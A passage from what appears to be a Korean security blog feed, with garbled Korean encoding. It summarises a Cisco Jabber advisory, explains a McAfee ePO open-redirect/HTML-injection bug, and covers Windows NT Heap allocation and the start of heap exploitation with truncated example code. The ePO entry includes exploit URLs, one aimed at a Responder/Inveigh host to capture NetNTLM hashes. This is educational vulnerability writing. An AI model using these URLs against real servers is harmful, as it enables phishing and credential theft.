    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-cisco-jabber-PWrTATTC">Cisco Jabber Desktop and Mobile Client Software Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Cisco Jabber for Windows, MacOS, mobile Platforms</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì–¸ì œ ì–´ë””ì„œë‚˜ ê¸°ê¸°ë¥¼ ì´ìš©í•˜ì—¬ ì§ì›ì˜ ìƒíƒœ ì •ë³´ í™•ì¸ ë° ì±„íŒ…, ìŒì„± í†µí™”, íšŒì˜ ë“±ì„ ì œê³µí•˜ëŠ” UC í´ë¼ì´ì–¸íŠ¸ì¸ Cisco Jabberì—ì„œ ê¶Œí•œ ìƒìŠ¹ ë° ì„ì˜ í”„ë¡œê·¸ë¨ ì‹¤í–‰, ì •ë³´ ìœ ì¶œ(Information Disclosure), ë„¤íŠ¸ì›Œí¬ íŒ¨í‚· intercept, DoS ê³µê²© ë“± ì—¬ëŸ¬ ê°€ì§€ ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>ê° ì·¨ì•½ì ì€ ì„œë¡œ ì—°ê´€ì„±ì´ ì—†ìœ¼ë©° í•˜ë‚˜ì˜ ì·¨ì•½ì ì— ì˜í–¥ì„ ë°›ëŠ” ë²„ì „ì´ë¼ë„ ë‹¤ë¥¸ ì·¨ì•½ì ì—” ì˜í–¥ì„ ë°›ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. Certificate Validationì„ ì œì™¸í•œ ì·¨ì•½ì ë“¤ì€ Cisco Jabberì˜ ì˜ëª»ëœ ë©”ì‹œì§€ content ê²€ì¦ìœ¼ë¡œ ì¸í•´ ë°œìƒí•©ë‹ˆë‹¤. ì´ë¥¼ í†µí•´ í•´ì»¤ëŠ” ì¡°ì‘ëœ <a href="https://ko.wikipedia.org/wiki/XMPP">XMPP</a> ë©”ì‹œì§€ë¥¼ íƒ€ê¹ƒ ì‹œìŠ¤í…œì— ì „ì†¡í•˜ì—¬ í´ë¼ì´ì–¸íŠ¸ë¥¼ ì‹¤í–‰ ì¤‘ì¸ ì‚¬ìš©ì ê¶Œí•œìœ¼ë¡œ ì„ì˜ í”„ë¡œê·¸ë¨ ì‹¤í–‰ì„ í•˜ê±°ë‚˜, í”„ë¡œê·¸ë¨ì˜ ì¸ì¦ ì •ë³´ë¥¼ ë°›ì•„ ì˜¤ê±°ë‚˜ ì„œë¹„ìŠ¤ ê±°ë¶€ ê³µê²©(Denial of Service)ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ë˜í•œ ìê²© ì¦ëª…ì— ëŒ€í•œ ì˜ëª»ëœ ìœ íš¨ì„± ê²€ì‚¬ë¡œ ì¸í•˜ì—¬ ë„¤íŠ¸ì›Œí¬ requestë¥¼ ê°€ë¡œì±„ ì¡°ì‘ëœ ì¸ì¦ì„œë¥¼ í†µí•´ í´ë¼ì´ì–¸íŠ¸ì™€ ì„œë²„ ê°„ì˜ ì—°ê²°ì„ í™•ì¸í•˜ê±°ë‚˜ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>idioth</tag>
      
      <tag>cisco</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2021-23888: McAfee ePolicy Orchestrator HTML Injection</title>
    <link href="/2021/03/28/insu/2021-03-28/"/>
    <url>/2021/03/28/insu/2021-03-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ricardojba.github.io/CVE-2021-23888-McAfee-ePolicy-Orchestrator-HTML-Injection/">CVE-2021-23888 - McAfee ePolicy Orchestrator HTML Injection</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>McAfee ePolicy Orchestrator</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>McAfee ePolicy Orchestrator 5.10 Update 10 ì´ì „ ë²„ì „ì—ì„œ ê²€ì¦ë˜ì§€ ì•Šì€ client ì¸¡ URL redirect ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ í†µí•´ ì¸ì¦ëœ ePO ì‚¬ìš©ìëŠ” ì‹ ë¢°ë˜ì§€ ì•Šì€ ePO IFRAMEì„ ë¡œë“œí•˜ì—¬ ì¸ì¦ëœ ì‚¬ìš©ìì˜ ì •ë³´ë¥¼ ë„ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>epo-host:<span class="hljs-number">8443</span><span class="hljs-regexp">/core/</span>orionNavigationLogin.<span class="hljs-keyword">do</span><span class="hljs-comment">#/core/orionDefaultPage.do</span></code></pre><p>ìœ„ì˜ ì£¼ì†Œë¡œ ì ‘ê·¼ì„ í•˜ê²Œ ë˜ë©´ <code>/core/orionDefaultPage.do</code>ê°€ IFRAME ë‚´ë¶€ì—ì„œ ì°¸ì¡°ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì—¬ëŸ¬ ì‹œë„ë¥¼ í†µí•´ <a href="https://epo-host:8443/core/orionNavigationLogin.do#//google.com"><code>https://epo-host:8443/core/orionNavigationLogin.do#//google.com</code></a> google search pageë¥¼ IFRAMEì—ì„œ ë¡œë“œí•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ê³µê²©ìëŠ” <code>#</code> ë’¤ì˜ domain/URLì„ ë°”ê¾¸ì–´ victimì—ê²Œ ë³´ë‚´ í”¼ì‹± ê³µê²©ì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/03/28/insu/2021-03-28/Untitled.png"></p><p>ë˜í•œ, hostì—ì„œ ì‹¤í–‰ë˜ëŠ” Responder-or-Inveighë¥¼ ê°€ë¦¬í‚¤ê²Œ í•´ ePO ì‚¬ìš©ìì˜ NetNTM í•´ì‹œë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>epo-host:<span class="hljs-number">8443</span><span class="hljs-regexp">/core/</span>orionNavigationLogin.<span class="hljs-keyword">do</span><span class="hljs-comment">#//host-running-responder-or-inveigh</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>insu</tag>
      
      <tag>mcafee</tag>
      
      <tag>html injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 3 - NT Heap(2)</title>
    <link href="/2021/03/28/l0ch/pwncoolsexy-part3/"/>
    <url>/2021/03/28/l0ch/pwncoolsexy-part3/</url>
    
    <content type="html"><![CDATA[<h1 id="ì´ì „-ì‹œë¦¬ì¦ˆ-ë°”ë¡œê°€ê¸°"><a href="#ì´ì „-ì‹œë¦¬ì¦ˆ-ë°”ë¡œê°€ê¸°" class="headerlink" title="ì´ì „ ì‹œë¦¬ì¦ˆ ë°”ë¡œê°€ê¸°"></a>ì´ì „ ì‹œë¦¬ì¦ˆ ë°”ë¡œê°€ê¸°</h1><p><a href="https://hackyboiz.github.io/2021/01/31/l0ch/pwncoolsexy-part1/">Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 1 - pwntools for windows</a></p><p><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/">Pwní•˜ê³  Coolí•˜ê³  Sexyí•œ Windows íƒë°©ê¸° Part 2 - NT Heap</a></p><hr><p>ì•ˆë…•í•˜ì„¸ìš”! ì§€ë‚œ í°ì¿¨ì„¹ì‹œ ì‹œë¦¬ì¦ˆì— ì´ì–´ ì˜¤ëŠ˜ë„ ìœˆë„ìš°ì— ê³ í†µë°›ê³  ìˆëŠ” L0chì…ë‹ˆë‹¤! </p><p>ì‹œì‘í•˜ê¸° ì „ì— ê·¼í™© ì–˜ê¸°ë¥¼ ì¡°ê¸ˆ í•˜ìë©´ ì œ í”„ë¡œí•„ ì‚¬ì§„ì´ ê±°ì§€ ê°™ì•„ì¡ŒìŠµë‹ˆë‹¤. ì•„ë‹ˆ ë¹„ìœ ê°€ ì•„ë‹ˆë¼ ë§ ê·¸ëŒ€ë¡œìš”â€¦ </p><p>ì–´ëŠ ë‚  idioth íŒ€ì¥í˜•(ì´ë¼ ì“°ê³  ë…ì¬ìë¼ê³  ì½ëŠ”ë‹¤)ì´ ê¸‰í•˜ê²Œ ë¶€ë¥´ê¸¸ë˜ ë¬´ìŠ¨ ì¼ì¸ê°€ í–ˆë”ë‹ˆ</p><blockquote><p>â€œì•¼ ë„ˆ ì§€ê¸ˆ í”„ë¡œí•„ ì‚¬ì§„ ë³„ë¡œë‹¤ ë‚´ê°€ ìƒˆë¡œ ê·¸ë ¤ì¤„ê¹Œ?â€<br>â€œã„´ã„´ ë‚˜ ì§€ê¸ˆ ë§ˆìŒì— ë“œëŠ”ë°â€<br>â€œë‚´ê°€ ë§ˆìŒì— ì•ˆ ë“¤ì–´ ê¸°ë‹¤ë ¤ë´ã…‹â€<br>(10ë¶„ ë’¤)</p></blockquote><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled.png" alt="pwncoolsexy-part3/Untitled.png"></p><blockquote><p>â€œ?â€<br>â€œã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ã…‹ ì´ê±¸ë¡œ í•¨ íŒ€ì¥ ê¶Œí•œìœ¼ë¡œ ì˜ê²¬ì€ ì•ˆ ë°›ìŒ ã……ã„±â€<br>â€œtqâ€</p></blockquote><p>íŒ€ì¥ì˜ ê¶Œë ¥ë‚¨ìš©ìœ¼ë¡œ ì œ ì˜ê²¬ì€ ë‹¨ 1ë„ ì—†ì´ í”„ë¡œí•„ ì‚¬ì§„ì„ ë³€ê²½ë‹¹í–ˆì–´ìš”. ë§ˆë¥¸í•˜ëŠ˜ì— ì›¬ ë‚ ë²¼ë½ì´ì§€ ì´ê²Œ</p><p>ì•Œê³  ë³´ë‹ˆ ì €ë§Œ ë‹¹í•œ ê²Œ ì•„ë‹ˆì—ˆë”ë¼êµ¬ìš” ã…‹.ã…‹  ì´ í˜• ìš°ë¦¬ ë†€ë¦¬ë ¤ê³  í•´í‚¹í•˜ëŠ” ê²Œ ë¶„ëª…í•´..</p><p><img src="/2021/03/28/l0ch/pwncoolsexy-part3/Untitled%201.png" alt="pwncoolsexy-part3/Untitled%201.png"></p><blockquote><p>ã„¹ã…‡ ë˜‘ê°™ì´ ê·¸ë ¤ì„œ ë” ë¶„í•˜ë‹¤</p></blockquote><p>ì´ë ‡ê²Œ ë˜ íŒ€ì¥ ì£½ì°½ 1ìŠ¤íƒì„ ìŒ“ìœ¼ë©° ì“´ ì´ë²ˆ ê¸€ì—ì„œëŠ” Part 2ì—ì„œ ì†Œê°œí•œ êµ¬ì¡°ì²´ë¥¼ NT Heapì´ ì–´ë–»ê²Œ ì¨ë¨¹ìœ¼ë©´ì„œ Heap ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ê³  í•´ì œí•˜ëŠ”ì§€ ì•Œì•„ë³´ê² ìŠµë‹ˆë‹¤.. </p><h1 id="Allocate-in-NT-Heap"><a href="#Allocate-in-NT-Heap" class="headerlink" title="Allocate in NT Heap"></a>Allocate in NT Heap</h1><p>Heap ë©”ëª¨ë¦¬ í• ë‹¹ ìš”ì²­ì´ ë“¤ì–´ì˜¤ë©´ NT Heapì˜ ë©”ëª¨ë¦¬ í• ë‹¹ ë™ì‘ì€ <code>RtlpAllocateHeap</code>ì—ì„œ ìš”ì²­ í¬ê¸°ì— ë”°ë¼ ë‹¤ìŒê³¼ ê°™ì´ ì„¸ ê°€ì§€ë¡œ ë‚˜ë‰©ë‹ˆë‹¤.</p><ul><li>Size â‰¤ 0x4000</li><li>0x4000 &lt; Size â‰¤ 0xff000</li><li>Size &gt; 0xff000</li></ul><p><code>0xff000</code>ì€ <code>_Heap-&gt;VirtualMemoryThreshold &lt;&lt; 4</code> ì˜ ê°’ì´ë©° ê°€ìƒ ë©”ëª¨ë¦¬ í• ë‹¹ ê¸°ì¤€ê°’ì…ë‹ˆë‹¤. ë˜í•œ LFHëŠ” í¬ê¸°ê°€ <code>0x4000</code> ì´í•˜ì¸ chunkë§Œ ê´€ë¦¬í•œë‹¤ê³  ì´ì „ ê¸€ì—ì„œ ì–¸ê¸‰í–ˆì—ˆì£ ? ê·¸ë˜ì„œ Non-LFHì™€ LFHì˜ í• ë‹¹ ë°©ì‹ì˜ ì°¨ì´ëŠ” í¬ê¸°ê°€ <code>0x4000</code>ì¼ ë•Œë§Œ ê³ ë ¤í•˜ë©´ ë©ë‹ˆë‹¤.</p><h2 id="Size-â‰¤-0x4000"><a href="#Size-â‰¤-0x4000" class="headerlink" title="Size â‰¤ 0x4000"></a>Size â‰¤ 0x4000</h2><p>ìš”ì²­ í¬ê¸°ê°€ <code>0x4000</code>ë³´ë‹¤ ì‘ìœ¼ë©´ ë¨¼ì € LFHê°€ í™œì„±í™”ë˜ì–´ ìˆëŠ”ì§€ ê²€ì‚¬í•œ ë’¤ í™œì„±í™” ì—¬ë¶€ì— ë”°ë¼ í• ë‹¹ ë°©ë²•ì„ ê²°ì •í•©ë‹ˆë‹¤.</p><h3 id="LFH-Disabled"><a href="#LFH-Disabled" class="headerlink" title="LFH Disabled"></a>LFH Disabled</h3><ol><li>LFHê°€ ë¹„í™œì„±í™”ë˜ì–´ ìˆìœ¼ë©´ <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP">_HEAP-&gt;FrontEndHeapUsageData</a>ì— <code>0x21</code>ì„ ë”í•œ ë’¤, í•´ë‹¹ ê°’ì´ <code>0xff00</code> ë˜ëŠ” <code>(&amp; 0x1f)</code>ê²°ê³¼ê°€ <code>0x10</code> ë³´ë‹¤ í°ì§€ ê²€ì‚¬í•©ë‹ˆë‹¤.<ul><li>ì¡°ê±´ì„ ë§Œì¡±í•˜ë©´ LFHë¥¼ í™œì„±í™”í•´ ë‹¤ìŒ chunkë¶€í„°ëŠ” LFHë¡œ í• ë‹¹ë©ë‹ˆë‹¤.</li></ul></li><li>ë¨¼ì € <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LIST-LOOKUP">_HEAP_LIST_LOOKUP-&gt;ListHint</a>ì— ìš”ì²­ëœ í¬ê¸°ì˜ chunkê°€ ìˆëŠ”ì§€ í™•ì¸í•˜ê³  ì ì ˆí•œ í¬ê¸°ì˜ ListHintê°€ ìˆìœ¼ë©´ chunkë¥¼ ê°€ì ¸ì™€ í• ë‹¹í•©ë‹ˆë‹¤.</li><li>ì ì ˆí•œ í¬ê¸°ì˜ chunkê°€ ì—†ìœ¼ë©´ ìš”ì²­ëœ í¬ê¸°ë³´ë‹¤ ë” í° í¬ê¸°ì˜ ListHintì—ì„œ ê°€ì ¸ì˜¨ chunkë¥¼ ë¶„í• í•˜ê³ , ë¶„í• í•˜ê³  ë‚¨ì€ chunkë¥¼ <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY">FreeList</a>ì— ì‚½ì…í•˜ê³  ListHintì— ë„£ìŠµë‹ˆë‹¤.</li><li>FreeListì— ì ì ˆí•œ chunkê°€ ì—†ìœ¼ë©´ <code>ExtendHeap</code>ìœ¼ë¡œ Heap spaceë¥¼ í™•ì¥í•´ chunkë¥¼ ê°€ì ¸ì™€ í• ë‹¹í•©ë‹ˆë‹¤.</li></ol><h3 id="LFH-Enabled"><a href="#LFH-Enabled" class="headerlink" title="LFH Enabled"></a>LFH Enabled</h3><p>LFHê°€ í™œì„±í™”ëœ ìƒíƒœì—ì„œëŠ” <code>RtlpLowFragHeapAllocFromContext</code> í•¨ìˆ˜ì—ì„œ ë‹¤ìŒê³¼ ê°™ì€ ê³¼ì •ìœ¼ë¡œ í• ë‹¹ë©ë‹ˆë‹¤.</p><ol><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LOCAL-SEGMENT-INFO">_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment</a>ê°€ ê°€ë¦¬í‚¤ëŠ” Subsegmentì˜ depthë¥¼ í™•ì¸í•´ í• ë‹¹ ê°€ëŠ¥í•œ chunkê°€ ìˆëŠ”ì§€ ë³´ê³ , ì—†ìœ¼ë©´ <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LOCAL-SEGMENT-INFO">_HEAP_LOCAL_SEGMENT_INFO-&gt;CachedItems</a> ì—ì„œ ê²€ìƒ‰í•©ë‹ˆë‹¤.</li><li><code>CachedItems</code>ì—ì„œ ê²€ìƒ‰í•œ ê²½ìš° <code>ActiveSubsegment</code>ë¥¼ <code>CachedItem</code>ì˜ Subsegmentë¡œ ë°”ê¿‰ë‹ˆë‹¤.</li><li><code>_HEAP_LOCAL_SEGMENT_INFO-&gt;ActiveSubsegment-&gt;AggregateExchg-&gt;Depth</code> ê°’ì„ 1 ê°ì†Œí•©ë‹ˆë‹¤.</li><li><code>0x0-0x7f</code> ì‚¬ì´ì˜ ëœë¤ ê°’ë“¤ë¡œ ì±„ì›Œì§„ 256 bytes ë°°ì—´ì¸ <code>RtlpLowFragHeapRandomData[x]</code> ì—ì„œ ì„ì˜ì˜ 1 bytes ê°’ì„ ì½ì–´ Heap chunkì˜ ì¸ë±ìŠ¤ë¡œ ì‚¬ìš©í•©ë‹ˆë‹¤.</li><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_USERDATA_HEADER-&gt;BusyBitmap</a> ë¹„íŠ¸ë§µì—ì„œ ì½ì–´ì˜¨ ì¸ë±ìŠ¤ ìœ„ì¹˜ì— chunkë¥¼ í• ë‹¹í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•˜ê³  í• ë‹¹í•©ë‹ˆë‹¤. í• ë‹¹ì´ ë¶ˆê°€ëŠ¥í•˜ë©´ ì¸ì ‘í•œ ìœ„ì¹˜ì˜ ë‹¤ë¥¸ indexë¥¼ ì°¾ìŠµë‹ˆë‹¤.</li></ol><h2 id="0x4000-lt-Size-â‰¤-0xff000"><a href="#0x4000-lt-Size-â‰¤-0xff000" class="headerlink" title="0x4000 &lt; Size â‰¤ 0xff000"></a>0x4000 &lt; Size â‰¤ 0xff000</h2><p>LFHê°€ ë¹„í™œì„±í™”ëœ <code>0x4000</code> ì´í•˜ í¬ê¸°ì˜ í• ë‹¹ í”„ë¡œì„¸ìŠ¤ì™€ ë™ì¼í•©ë‹ˆë‹¤. ê°„ë‹¨í•˜ì£ ? </p><h2 id="Size-gt-0xff000"><a href="#Size-gt-0xff000" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h2><p>ìš”ì²­ ì‚¬ì´ì¦ˆê°€ <code>0xff000</code>ë³´ë‹¤ í´ ê²½ìš° <code>ZwAllocateVirtualMemory()</code>ë¼ëŠ” ê°€ìƒ ë©”ëª¨ë¦¬ í• ë‹¹ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ë©°, í•´ë‹¹ chunkëŠ” <code>_HEAP_ENTRY</code> ëŒ€ì‹  <code>_HEAP_VIRTUAL_ALLOC_ENTRY</code> êµ¬ì¡°ì²´ê°€ headerê°€ ë©ë‹ˆë‹¤. </p><h1 id="Free-in-NT-Heap"><a href="#Free-in-NT-Heap" class="headerlink" title="Free in NT Heap"></a>Free in NT Heap</h1><p>Free í•  ë•ŒëŠ” chunk í¬ê¸°ì— ë”°ë¼ ë‘ ê°€ì§€ë¡œ ë‚˜ë‰©ë‹ˆë‹¤.</p><ul><li>Size â‰¤ 0xff000</li><li>Size &gt; 0xff000</li></ul><h2 id="Size-â‰¤-0xff000"><a href="#Size-â‰¤-0xff000" class="headerlink" title="Size â‰¤ 0xff000"></a>Size â‰¤ 0xff000</h2><p>ë¨¼ì € <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-ENTRY">_HEAP_ENTRY-&gt;UnusedBytes</a> ì—ì„œ í•´ë‹¹ chunkê°€ LFHë¡œ ê´€ë¦¬ë˜ê³  ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</p><h3 id="LFH-Disabled-1"><a href="#LFH-Disabled-1" class="headerlink" title="LFH Disabled"></a>LFH Disabled</h3><ol><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-ENTRY">_HEAP-&gt;FrontEndHeapUsageData</a> ê°’ì„ 1 ê°ì†Œì‹œí‚µë‹ˆë‹¤.</li><li>ì´ì „ í˜¹ì€ ë‹¤ìŒ chunkê°€ free ëœ ìƒíƒœë©´ free í•  í•´ë‹¹ chunkì™€ ë³‘í•©í•©ë‹ˆë‹¤.</li><li>ë³‘í•©í•œ chunkë¥¼ <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY">_HEAP_ENTRY-&gt;FreeList</a>ì˜ ì‹œì‘ í˜¹ì€ ëì— ì‚½ì…í•  ìˆ˜ ìˆëŠ”ì§€ í™•ì¸í•©ë‹ˆë‹¤.</li><li>ì‚½ì… ê°€ëŠ¥í•˜ë©´ <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#FreeLists-HEAP-ENTRY">_HEAP_ENTRY-&gt;FreeList</a>ì—, ì•„ë‹ˆë¼ë©´ <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-LIST-LOOKUP">_HEAP_LIST_LOOKUP-&gt;ListHint</a>ì— chunkë¥¼ ì‚½ì…í•©ë‹ˆë‹¤.</li></ol><h3 id="LFH-Enabled-1"><a href="#LFH-Enabled-1" class="headerlink" title="LFH Enabled"></a>LFH Enabled</h3><ol><li>headerë¥¼ ë””ì½”ë”©í•´ <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_USERDATA_HEADER</a> ì™€ <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_SUBSEGMENT</a> ë¥¼ êµ¬í•©ë‹ˆë‹¤.</li><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_ENTRY-&gt;UnusedBytes</a> ê°’ì„ <code>0x80</code>ìœ¼ë¡œ ìˆ˜ì •í•©ë‹ˆë‹¤.<ul><li><code>UnusedBytes</code>ê°€ <code>0x80</code>ì´ë©´ í•´ì œëœ LFH chunkë¡œ ì¸ì‹í•©ë‹ˆë‹¤.</li></ul></li><li>chunkì˜ ì¸ë±ìŠ¤ë¥¼ ì°¾ì•„ ë©”ëª¨ë¦¬ í• ë‹¹ ë¹„íŠ¸ë§µì¸ <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-USERDATA-HEADER">_HEAP_USERDATA_HEADER-&gt;BusyBitmap</a>ì— í•´ì œí•  chunkì— í•´ë‹¹í•˜ëŠ” bitë¥¼ 0ìœ¼ë¡œ ìˆ˜ì •í•©ë‹ˆë‹¤.</li><li><a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP-SUBSEGMENT">_HEAP_SUBSEGMENT-&gt;AggregateExchg</a> ì˜ depthë¥¼ 1 ì¦ê°€ì‹œí‚µë‹ˆë‹¤.</li><li>ë§Œì•½ í•´ì œëœ chunkê°€ <code>ActiveSubsegment</code> ì— ì†í•˜ì§€ ì•Šì€ ê²½ìš° <code>CachedItem</code> ì— ë„£ìŠµë‹ˆë‹¤.</li></ol><h2 id="Size-gt-0xff000-1"><a href="#Size-gt-0xff000-1" class="headerlink" title="Size &gt; 0xff000"></a>Size &gt; 0xff000</h2><ol><li>í•´ì œí•  chunkë¥¼ <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#HEAP">_HEAP-&gt;VirtualAllocdBlocks</a> ì—ì„œ ì œê±°í•©ë‹ˆë‹¤.</li><li><code>RtlSecMemFreeVirtualMemory</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ í• ë‹¹ í•´ì œí•©ë‹ˆë‹¤.</li></ol><p>ë³µì¡í•œ ê²ƒì²˜ëŸ¼ ë³´ì´ì§€ë§Œ, ì‚¬ìš©í•˜ëŠ” êµ¬ì¡°ì²´ í•„ë“œ ì„¤ëª…ì„ ë³´ë©´ì„œ ì´í•´í•˜ë©´ <del>ê·¸ë˜ë„ ë³µì¡í•˜ì§€ë§Œ</del> Heap ë©”ëª¨ë¦¬ë¥¼ ì–´ë–»ê²Œ ê´€ë¦¬í•˜ëŠ”ì§€ ë³´ì…ë‹ˆë‹¤!</p><h1 id="NT-Heap-Exploitation"><a href="#NT-Heap-Exploitation" class="headerlink" title="NT Heap Exploitation"></a>NT Heap Exploitation</h1><p>ì¼ë°˜ì ì¸ Back-End exploitationê³¼ LFHì¸ Front-End exploitation ë‘ ê°€ì§€ë¡œ ë‚˜ë‰©ë‹ˆë‹¤. </p><h3 id="Back-End-Exploitation"><a href="#Back-End-Exploitation" class="headerlink" title="Back-End Exploitation"></a>Back-End Exploitation</h3><p>LFHëŠ” <code>0x4000</code> ì´í•˜ í¬ê¸°ì˜ chunkê°€ 18ê°œ í• ë‹¹ë  ë•Œë¶€í„° í™œì„±í™”ëœë‹¤ëŠ” <a href="https://hackyboiz.github.io/2021/02/28/l0ch/pwncoolsexy-part2/#Low-Fragmentation-Heap">ë‚´ìš©</a>ì´ part 2ì—ì„œ ë‚˜ì™”ì—ˆì£ ? Back-Endì—ì„œ ì·¨ì•½ì ì„ íŠ¸ë¦¬ê±°í•˜ë ¤ë©´ LFHê°€ ë¹„í™œì„±í™”ëœ ìƒíƒœì—¬ì•¼ í•˜ë¯€ë¡œ chunk í• ë‹¹ì„ 18ê°œ ë¯¸ë§Œìœ¼ë¡œ ì œí•œí•´ì•¼ í•©ë‹ˆë‹¤. ë³´í†µ ì²« ë²ˆì§¸(index 0)ì™€ ë‘ ë²ˆì§¸(index 1) í• ë‹¹ì—ë„ chunk ê°„ ê±°ë¦¬ê°€ í¬ê¸° ë•Œë¬¸ì— ì í•©í•˜ì§€ ì•Šìœ¼ë‹ˆ ìš°ë¦¬ê°€ ì ‘ê·¼í•˜ê¸° ì¢‹ì€ chunkì˜ indexëŠ” 2 ~ 16 ê¹Œì§€ê² ë„¤ìš”. ê·¸ ì´í›„ì—ëŠ” ì¼ë°˜ì ì¸ heap overflowë¡œ chunkë¥¼ ì •ë ¬í•˜ê³  í•„ìš”í•œ ì£¼ì†Œë¥¼ leak í•˜ëŠ” ë°©ë²•ê³¼ ë™ì¼í•©ë‹ˆë‹¤.</p><p>ì˜ˆì œì½”ë“œë¡œ í™•ì¸í•´ë³¼ê²Œìš”.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;comdef.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CHUNK_SIZE 0x190</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ALLOC_COUNT 10</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SomeObject</span> &#123;</span><span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">function1</span><span class="hljs-params">()</span> </span>&#123;&#125;;    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">virtual_function1</span><span class="hljs-params">()</span> </span>&#123;&#125;;&#125;;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> args, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    <span 